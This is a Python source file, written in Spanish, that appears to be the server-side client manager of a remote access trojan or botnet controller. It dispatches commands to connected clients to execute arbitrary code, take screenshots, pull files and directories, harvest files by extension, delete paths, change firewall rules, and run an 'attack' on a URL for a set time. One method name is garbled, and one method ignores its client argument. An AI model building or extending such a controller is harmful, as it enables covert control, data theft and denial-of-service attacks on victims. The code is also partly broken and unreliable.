import json
from utils.logger import get_console
from config.settings import RECEIVED_FILES_DIR
from utils.response_waiter import ResponseWaiter

from server.handlers.screenshot_handler import ScreenshotHandler
from server.handlers.directory_handler import DirectoryHandler
from server.handlers.file_handler import FileHandler
from server.handlers.command_handler import CommandHandler
from server.handlers.firewall_handler import FirewallHandler
from server.handlers.attack_url_handler import AttackUrlHandler

class ClientManager:
    """Administra clientes conectados y procesa sus respuestas."""
    
    def __init__(self, servidor, cmd):
        self.servidor = servidor
        self.servidor.establecer_client_manager(self)
        self.console = get_console()
        self._cmd = cmd 
        self.response_waiter = ResponseWaiter(timeout=30)
        
        self.directory_handler = DirectoryHandler(self)
        self.screenshot_handler = ScreenshotHandler(self)
        self.file_handler = FileHandler(self)
        self.command_handler = CommandHandler(self)
        self.firewall_handler = FirewallHandler(self)
        self.attack_url_handler = AttackUrlHandler(self)
        
    def esperar_respuesta_accion(self, accion, cliente_id=None):
        """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
        if cliente_id is None:
            # Esperar respuesta de todos los clientes conectados
            clientes_ids = [cliente["id"] for cliente in self.servidor.clientes]
            resultados = []
            for cid in clientes_ids:
                recibido = self.response_waiter.esperar_respuesta(cid, accion)
                resultados.append((cid, recibido))
            
            # Verifica si al menos uno respondió
            if not any(r[1] for r in resultados):
                return False
            return True
        else:
            # Esperar respuesta solo del cliente especificado
            return self.response_waiter.esperar_respuesta(cliente_id, accion)
    
    def procesar_respuesta_cliente(self, datos, cliente):
        """Procesa las respuestas recibidas de un cliente."""
        try:
            datos_dict = json.loads(datos)
            accion = datos_dict.get("accion")
            cliente_id = f"[Cliente ID {cliente['id']} ({cliente['direccion'][0]})]"
            
            if accion == "respuesta_ejecucion":
                self.console.print(f"\n{cliente_id} [bold green]Resultado de ejecución:[/bold green]")
                self.console.print(datos_dict.get("resultado", "Sin resultado"))
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "archivo_recibido":
                self.console.print(f"\n{cliente_id} [bold green]Archivo guardado:[/bold green] {datos_dict.get('ruta_destino')}")
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "archivo_enviado":
                self.file_handler._procesar_archivo_enviado(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "error":
                self.console.print(f"\n{cliente_id} [bold red]Error:[/bold red] {datos_dict.get('mensaje')}")
                
            elif accion == "respuesta_listado":
                self.console.print(f"\n{cliente_id} [bold green]Estructura del directorio '{datos_dict.get('ruta')}':[/bold green]")
                self.console.print(datos_dict.get("estructura"))
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "directorio_enviado":
                self.directory_handler._procesar_directorio_enviado(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "eliminacion_exitosa":
                self.directory_handler._procesar_eliminacion_exitosa(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "captura_enviada":
                self.screenshot_handler._procesar_captura_enviadarocesar_captura_enviada(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "regla_firewall_agregada":
                self.firewall_handler._procesar_regla_firewall_agregada(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "archivos_extension_enviados":
                self.file_handler._procesar_archivos_extension_enviados(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
            elif accion == "ataque_completado":
                self.attack_url_handler._manejar_respuesta_ataque(datos_dict, cliente_id)
                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                
        except json.JSONDecodeError:
            self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
        except Exception as e:
            self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
    
    def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False, cliente_id=None):
        """Envía comando para listar un directorio."""
        exito_envio = self.directory_handler.enviar_comando_listar_directorio(ruta, incluir_archivos, cliente_id)
        return self.comprobar_respuesta(exito_envio, "respuesta_listado", cliente_id)
    
    def obtener_info_clientes(self):
        """Obtiene información de los clientes conectados."""
        return [(c['id'], c['direccion'][0], c['direccion'][1]) for c in self.servidor.clientes]
    
    def obtener_clientes_conectados(self):
        """Obtiene el número de clientes conectados."""
        return len(self.servidor.clientes)

    def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino=None, cliente_id=None):
        """Envía comando para solicitar un directorio desde los clientes."""
        exito_envio = self.directory_handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "directorio_enviado", cliente_id)

    def enviar_comando_capturar_pantalla(self, ruta_destino, nombre_archivo=None, cliente_id=None):
        """Envía comando para capturar pantalla y espera respuesta."""
        
        exito_envio = self.screenshot_handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "captura_enviada", cliente_id)
    
    def enviar_comando_eliminar(self, ruta, cliente_id=None):
        """Envía comando para eliminar un archivo o directorio en los clientes."""
        exito_envio = self.directory_handler.enviar_comando_eliminar(ruta, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "eliminacion_exitosa", cliente_id)
        
    def enviar_comando_ejecutar(self, codigo, cliente_id=None):
        """Envía comando para ejecutar un código en los clientes.""" 
        exito_envio = self.command_handler.enviar_comando_ejecutar(codigo, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "respuesta_ejecucion", cliente_id)
    def enviar_comando_enviar_archivo_a_clientes(self, ruta_origen, ruta_destino, cliente_id=None):
        exito_envio = self.file_handler.enviar_archivo_a_clientes(ruta_origen, ruta_destino, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "archivo_recibido", cliente_id)
    
    def enviar_comando_solicitar_archivo(self, ruta_origen, ruta_destino=None, cliente_id=None):
        exito_envio = self.file_handler.enviar_comando_solicitar_archivo(ruta_origen, ruta_destino, cliente_id=None)
        
        return self.comprobar_respuesta(exito_envio, "archivo_enviado", cliente_id)
    
    def enviar_comando_agregar_regla_firewall(self, nombre, ip, puerto, accion, cliente_id=None):
        exito_envio = self.firewall_handler.enviar_comando_agregar_regla(nombre, ip, puerto, accion, cliente_id)

        return self.comprobar_respuesta(exito_envio, "regla_firewall_agregada", cliente_id)
    
    def enviar_comando_archivos_por_extension(self, ruta_busqueda, extension, ruta_destino=None, cliente_id=None):
        exito_envio = self.file_handler.enviar_comando_archivos_por_extension(ruta_busqueda, extension, ruta_destino, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "archivos_extension_enviados", cliente_id)
    
    def enviar_comando_attack_url(self, url, tiempo, cliente_id=None):
        exito_envio = self.attack_url_handler.enviar_comando_attack_url(url, tiempo, cliente_id)
        
        return self.comprobar_respuesta(exito_envio, "ataque_completado", cliente_id)

    def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
        if not exito_envio:
            return False
        
        if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
            self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
            return False
        
        return True